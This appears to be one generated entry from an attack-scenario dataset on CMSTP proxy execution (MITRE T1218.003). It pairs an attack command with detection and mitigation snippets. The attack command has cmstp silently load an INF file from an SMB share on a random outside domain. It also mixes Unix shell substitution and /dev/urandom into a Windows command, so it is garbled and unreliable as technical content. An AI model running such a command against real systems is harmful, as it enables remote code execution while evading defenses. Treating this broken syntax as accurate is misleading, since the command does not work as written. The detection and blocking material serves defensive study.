---
type: campaign
scenario_id: 499
tactic: Defense Evasion
technique: "T1218.003: CMSTP"
technique_id: T1218.003
tags: [campaign, lotl, defense_evasion]
---

# Using cmstp to execute DNS tunneling INF via SMB share.

## Threat Description
Using cmstp to execute DNS tunneling INF via SMB share.

## Attack Command
```
cmstp /ni /s \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com\$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor cmstp SMB: `wmic process where name='cmstp.exe' get commandline | findstr \\`; YARA rule: `rule CmstpSmbDnsTunnel { strings: $a = /cmstp.*\\.*inf/ nocase; condition: $a }`.

## Mitigation
Restrict cmstp: `icacls %windir%\System32\cmstp.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=out action=block protocol=TCP remoteport=445`.

## AI Training Prompt
Train AI to detect cmstp-based DNS tunneling INF execution via SMB shares by analyzing SMB paths, cmstp command-line arguments, and DNS query patterns; suggest SMB restrictions.

## References
- MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
